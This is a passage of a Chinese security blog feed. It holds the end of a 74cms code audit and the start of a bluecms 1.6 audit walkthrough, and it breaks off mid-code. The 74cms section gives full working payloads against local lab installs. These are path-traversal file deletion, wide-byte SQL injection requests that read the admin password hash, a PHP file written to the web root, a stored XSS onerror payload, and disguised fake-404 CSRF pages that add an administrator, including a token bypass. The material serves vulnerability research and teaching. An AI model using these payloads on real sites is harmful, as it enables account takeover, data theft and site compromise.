class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">$_POST = admin_addslashes_deep($_POST);</span><br><span class="line">$_GET = admin_addslashes_deep($_GET);</span><br><span class="line">$_COOKIE = admin_addslashes_deep($_COOKIE);</span><br><span class="line">$_REQUEST = admin_addslashes_deep($_REQUEST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>admin_addslashes_deep</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">admin_addslashes_deep</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($value))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> is_array($value) ? array_map(<span class="string">'admin_addslashes_deep'</span>, $value) : addslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现后台对于客户端提交的数据只有转义的处理，是不会过滤掉标签的</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="1-任意文件删除漏洞"><a href="#1-任意文件删除漏洞" class="headerlink" title="1.任意文件删除漏洞"></a>1.任意文件删除漏洞</h3><p><code>/admin/admin_article.php</code>第151-152行中存在可利用变量<code>$_GET[&#39;img&#39;]</code>导致任意文件删除漏洞</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在全局分析中，我们知道，后台对<code>$_GET</code>只有转义的处理，所以我们构造路径穿越进行删除文件</p><p>payload：<code>?act=del_img&amp;img=../../info.php</code></p><h3 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2.SQL注入"></a>2.SQL注入</h3><p><code>/user/user_personal.php</code>第947-951行存在可利用变量<code>$setsqlarr</code>导致SQL注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们可以注意到这里的数组变量<code>$setsqlarr</code>中的各个属性变量都只有转义的处理就拼接到SQL语句中，这是一个用户基本信息保存的功能代码，当查询不到<code>$SESSION[&#39;uid&#39;]</code>即未保存过信息时，会使用<code>INSERT</code>语句。反之则使用<code>UPDATE</code>语句，然后将保存的个人信息渲染到html页面中，跟踪一下<code>updatetable()</code>函数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>了解语句后，我们先保存一个个人信息</p><p>之后再进行修改操作，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /74cms/user/user_personal.php?act=userprofile_save HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 193</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/74cms/user/user_personal.php?act=userprofile</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: QS[uid]=1; QS[username]=user01; QS[password]=f9b56fc246a5142ad76408997edc1e4d; QS[utype]=2; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">realname=123&amp;sex=%C4%D0&amp;birthday=111111&amp;addresses=12312332&amp;mobile=18912345678&amp;phone=254221&amp;qq=12345&amp;msn=123%df&apos;,`profile`=(select pwd from 74_admin) where uid=1#&amp;profile=123&amp;Submit=%B1%A3%B4%E6</span><br></pre></td></tr></table></figure><p>拼接后的sql语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="number">74</span>cms_members_info <span class="keyword">SET</span> <span class="string">`realname`</span>=<span class="string">'123'</span>, <span class="string">`sex`</span>=<span class="string">'男'</span>, <span class="string">`birthday`</span>=<span class="string">'111111'</span>, <span class="string">`addresses`</span>=<span class="string">'12312332'</span>, <span class="string">`mobile`</span>=<span class="string">'18912345678'</span>, <span class="string">`phone`</span>=<span class="string">'254221'</span>, <span class="string">`qq`</span>=<span class="string">'12345'</span>, <span class="string">`msn`</span>=<span class="string">'123�\\\',`profile`=database() where uid=1#'</span>, <span class="string">`profile`</span>=<span class="string">'123'</span> <span class="keyword">WHERE</span>  uid=<span class="string">'1'</span><span class="string">`</span></span><br></pre></td></tr></table></figure><p>执行后<code>profile</code>字段显示的值就是数据库名</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>另外<code>/user/user_company_points.php</code>第861行同样存在可利用变量<code>$setsqlarr</code>，导致SQL注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /74cms/user/user_company_points.php?act=company_profile_save HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 416</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/74cms/user/user_company_points.php?act=company_profile</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: QS[uid]=2; QS[username]=user02; QS[password]=fd14a8ceb080688b964f9f89a66a730d; QS[utype]=1; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">companyname=1234&amp;nature_cn=%B9%FA%C6%F3&amp;nature=46&amp;trade_cn=%BC%C6%CB%E3%BB%FA%C8%ED%BC%FE%2F%D3%B2%BC%FE&amp;trade=1&amp;district_cn=%B5%D8%C7%F81+%2F+%B5%D8%C7%F81%D7%D3%C0%E0&amp;district=1&amp;sdistrict=2&amp;scale_cn=20%C8%CB%D2%D4%CF%C2&amp;scale=80&amp;registered=123&amp;currency=%C8%CB%C3%F1%B1%D2&amp;contact=123&amp;telephone=1234567&amp;email=123%40123.com&amp;website=%df&apos;,`contents`=database() where uid=2#&amp;address=123&amp;contents=123&amp;Submit=%B1%A3%B4%E6</span><br></pre></td></tr></table></figure><p>该cms存在多处<code>$setsqlarr</code>都可以利用，不止以上两个，不一一列举</p><h3 id="3-任意文件写入漏洞"><a href="#3-任意文件写入漏洞" class="headerlink" title="3.任意文件写入漏洞"></a>3.任意文件写入漏洞</h3><p><code>/admin/admin_templates.php</code>第125行<code>fwrite()</code>函数中存在可利用变量<code>$handle</code>和<code>$tpl_content</code>，导致任意文件写入漏洞</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在全局分析中，我们已经知道后台对我们提交的数据只有转义处理，所以我们可以很容易的写入一个webshell，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /74cms/admin/admin_templates.php?act=do_edit HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: QS[uid]=1; QS[username]=user01; QS[password]=f9b56fc246a5142ad76408997edc1e4d; QS[utype]=2; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 61</span><br><span class="line"></span><br><span class="line">tpl_dir=../&amp;tpl_name=info.php&amp;tpl_content=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>执行完成后在网站根目录下写入一个webshell</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="4-存储型XSS漏洞"><a href="#4-存储型XSS漏洞" class="headerlink" title="4.存储型XSS漏洞"></a>4.存储型XSS漏洞</h3><p><code>/link/add_link.php</code>第36行存在可利用变量<code>$_POST[&#39;link_logo&#39;]</code>在<code>/admin/admin_link.php</code>中将该变量渲染到<code>/admin/templates/default/link/admin_link.htm</code>的<code>&lt;span style=&quot;color:#FF6600&quot; title=&quot;&lt;img src= border=0/&gt;&quot; class=&quot;vtip&quot;&gt;[logo]&lt;/span&gt;</code>中，存在存储型XSS漏洞</p><p><code>/link/add_link.php</code>对添加的链接信息数组<code>$setsqlarr</code>有转义加去标签的处理</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后<code>/admin/admin_link.php</code>中<code>get_links()</code>函数将添加的链接信息从数据库中取出渲染到前台页面中</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们跟进<code>link/admin_link.htm</code></p><p>在第58行中<code>&lt;span style=&quot;color:#FF6600&quot; title=&quot;&lt;img src= border=0/&gt;&quot; class=&quot;vtip&quot;&gt;[logo]&lt;/span&gt;</code>我们可以看到前台将<code>link_logo</code>这以变量值作为<code>img</code>标签的读取源，虽然有去标签的处理，但是这里我们不需要加入标签，利用<strong>onerror</strong>事件也可以进行XSS攻击</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /74cms/link/add_link.php?act=save HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 117</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/74cms/link/add_link.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: QS[uid]=2; QS[username]=user02; QS[password]=fd14a8ceb080688b964f9f89a66a730d; QS[utype]=1; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">alias=QS_index&amp;link_name=123&amp;link_url=123&amp;link_logo=%23+onerror%3Dalert%28%2Fxss%2F%29&amp;app_notes=&amp;Submit=%CC%E1%BD%BB</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>执行成功后，在页面每次将鼠标移动至<strong>[logo]</strong>处都会弹框</p><h3 id="5-CSRF漏洞"><a href="#5-CSRF漏洞" class="headerlink" title="5.CSRF漏洞"></a>5.CSRF漏洞</h3><p><code>/admin/admin_users.php</code>第42-68行由于未加入token验证，可以造成CSRF漏洞任意添加管理员账号</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>攻击过程：构造一个虚假404页面诱导管理员点击，页面代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The requested URL /info.php was not found on this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        function  add() &#123;</span></span><br><span class="line"><span class="undefined">            var  xmlhttp = new XMLHttpRequest();</span></span><br><span class="line"><span class="undefined">            var  xmldata = 'admin_name=test2&amp;email=1234%40123.com&amp;password=123456&amp;password1=123456&amp;rank=123&amp;submit3=%CC%ED%BC%D3';</span></span><br><span class="line"><span class="undefined">      xmlhttp.open('POST','http://127.0.0.1/74cms/admin/admin_users.php?act=add_users_save',true);</span></span><br><span class="line"><span class="undefined">            xmlhttp.setRequestHeader('Content-Type','application/x-www-form-urlencoded');</span></span><br><span class="line"><span class="undefined">            xmlhttp.withCredentials='true'; </span></span><br><span class="line"><span class="undefined">            xmlhttp.send(xmldata);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        add();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>页面利用ajax技术在后台将注册信息提交到<code>admin/admin_users.php</code></p><p>另外在74cms 3.6版本中添加了token机制认证，我们知道token认证机制是取出当前页面提交的token与存放在<strong>Session</strong>中的token值进行比较，相同则通过验证，每当我们刷新一次页面，token值就会发生变化。但是我们仍然可以进行CSRF攻击，办法就是利用iframe框架访问token值的页面，再利用js代码获取token值与信息一起提交即可，附上3.6版本csrf攻击的代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        function  add() &#123;</span></span><br><span class="line"><span class="undefined">            var token = document.getElementById('hack').contentWindow.document.getElementsByName('hiddentoken')[0].value;</span></span><br><span class="line"><span class="undefined">            var  xmlhttp = new XMLHttpRequest();</span></span><br><span class="line"><span class="undefined">            var  xmldata = 'admin_name=test2&amp;email=1234%40123.com&amp;password=123456&amp;password1=123456&amp;rank=123&amp;submit3=%CC%ED%BC%D3&amp;hiddentoken='+token;</span></span><br><span class="line"><span class="undefined">            xmlhttp.open('POST','http://127.0.0.1/74cms3.6/admin/admin_users.php?act=add_users_save',true);</span></span><br><span class="line"><span class="undefined">            xmlhttp.setRequestHeader('Content-Type','application/x-www-form-urlencoded');</span></span><br><span class="line"><span class="undefined">            xmlhttp.withCredentials='true'; </span></span><br><span class="line"><span class="undefined">            xmlhttp.send(xmldata);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/74cms3.6/admin/admin_users.php?act=add_users"</span> <span class="attr">id</span>=<span class="string">'hack'</span> <span class="attr">border</span>=<span class="string">'0'</span> <span class="attr">style</span>=<span class="string">'display:none'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"add()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The requested URL /info.php was not found on this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该cms很多漏洞的利用点都在于未对SQL数组变量<code>$setsqlarr</code>进行过滤以及对后台输入只有转义处理，存在诸多输入过滤不足的情况</p>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计--bluecms1.6</title>
    <link href="https://Foxgrin.github.io//posts/52227/"/>
    <id>https://Foxgrin.github.io//posts/52227/</id>
    <published>2019-03-13T11:15:00.000Z</published>
    <updated>2019-03-14T12:00:06.871Z</updated>
    
    <content type="html"><![CDATA[<p>记录bluecms1.6审计过程以及漏洞分析<a id="more"></a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>笔者属于新手，刚接触审计不久，刚拿到一个完全陌生的cms，一开始完全不知道如何下手，所以我通过不断阅读别人的审计文章，重点观察别人的审计思路，一开始看别人的审计文章其实不应该关注这个cms到底有什么漏洞，因为那都是别人已经审计好了的，你应该重点关注别人到底是怎么挖到这个洞的，这样你才能锻炼独立审计的能力，这篇文章我也会把我审计的全过程思路分享出来。</p><h2 id="全局分析"><a href="#全局分析" class="headerlink" title="全局分析"></a>全局分析</h2><p>首先拿到这个bluecms，安装完成后，我首先观察整个cms的文件结构</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>其实每个文件夹的功能从名字就大概能猜出，比如<code>/admin</code>肯定是后台管理员才能访问进行管理的；<code>/include</code>肯定是用来包含的全局文件，例如一些函数定义的文件，一些数据库配置，过滤文件等等；<code>/templates</code>肯定是一些模板文件，看到这个文件夹就能猜到这里面放着的都是一些html模板，用来通过后台进行渲染的。当然这都是初步的大致浏览，具体还要等到后面访问页面才知道。</p><p>下面，浏览了网页结构，就开始审计具体文件了，那么问题来了，审计哪个呢，这么多文件。这里我的思路还是首先访问根目录下的<code>index.php</code>文件，因为它是整个网站的首页。</p><p>先来看看首页的代码：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>好多，将近300行，肯定不可能一行行的看，这里我首先还是先看主页面的开头包含了什么文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">'include/common.inc.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(BLUE_ROOT.<span class="string">'include/index.fun.php'</span>);</span><br></pre></td></tr></table></figure><p>前面说到<code>/include</code>文件夹，果然就包含了里面的文件，这些文件往往对我们审计过程都非常重要，一定要重视</p><p>先来看看<code>include/common.inc.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#30-36行</span></span><br><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">$_POST = deep_addslashes($_POST);</span><br><span class="line">$_GET = deep_addslashes($_GET);</span><br><span class="line">$_COOKIES = deep_addslashes($_COOKIES);</span><br><span class="line">$_REQUEST = deep_addslashes($_REQUEST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们马上就发现了在30-36行处，对全局数组POST，GET，COOKIES，REQUEST都进行了转义处理，所以只要通过这些方式输入的数据中存在单引号，双引号都会被转义。这就是为什么强调开头这些包含文件的重要性，如果我们没看到，就忽略了这些过滤，后面例如sql注入的注入点被单引号包裹，我们不知道有过滤还以为可以进行注入</p><p>另外在24-28行处还包含了一些函数文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> (BLUE_ROOT.<span class="string">'include/common.fun.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(BLUE_ROOT.<span class="string">'include/cat.fun.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(BLUE_ROOT.<span class="string">'include/cache.fun.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(BLUE_ROOT.<span class="string">'include/user.fun.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(BLUE_ROOT.<span class="string">'include/index.fun.php'</span>);</span><br></pre></td></tr></table></figure><p>后面遇到看不懂的函数，可以通过跟踪函数名在这些文件中搜索</p><p>就这样大致浏览一下这些文件的开头部分，后面其实大多都是功能部分，我们有的其实都不用去关注，毕竟我们本来就不可能每行都去看一遍</p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="1-跟踪输入变量"><a href="#1-跟踪输入变量" class="headerlink" title="1.跟踪输入变量"></a>1.跟踪输入变量</h3><p>笔者一开始审计，也是很盲目，看了半天代码，还是看不出哪儿存在漏洞，主要一个原因还是代码太多了。所以感觉挖掘漏洞，还是要有方法，有明确思路，这样才能有效快速。在我浏览别人的审计文章时，看到了一句话：“有输入的地方就可能存在漏洞”。这句话讲的很有道理，这么多的web漏洞，本质上都是存在用户的输入才导致的，所以，我一开始就是关注每个文件哪里存在用户的输入。</p><p>从根目录开始，按顺序我们先来看看<code>ad_js.php</code>文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">'ad_id'</span>]) ? trim($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</span><br></pre></td></tr></table></figure><p>文件很短，我们可以一口气将它看完，开头就有我们可以通过GET方式进行控制的变量，继续看下去，我们马上就看到了一个sql查询语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ad = $db-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.$ad_id);</span><br></pre></td></tr></table></figure><p>在前面我们说过，在<code>common.inc.php</code>文件中对我们的输入方式进行转义的过滤，我们注意到这个文件开头就包含了它，说明这里对<strong>$ad_id</strong>变量是存在转义处理的，但是这里的sql语句中<strong>$ad_id</strong>是没有单引号包裹的，所以我们根本不需要去关注过滤，很明显这里就存在了sql注入漏洞，具体利用后面在一起说</p><p>接下来是<code>ann.php</code>文件，这个文件就有点长，但是我们无需关心，只看开头有没有可以利用的变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ann_id = !<span class="keyword">empty</span>($_REQUEST[<span class="string">'ann_id'</span>]) ? intval($_REQUEST[<span class="string">'ann_id'</span>]) : <span class="string">''</span>;</span><br><span class="line">$cid = !<span class="keyword">empty</span>($_REQUEST[<span class="string">'cid'</span>]) ? 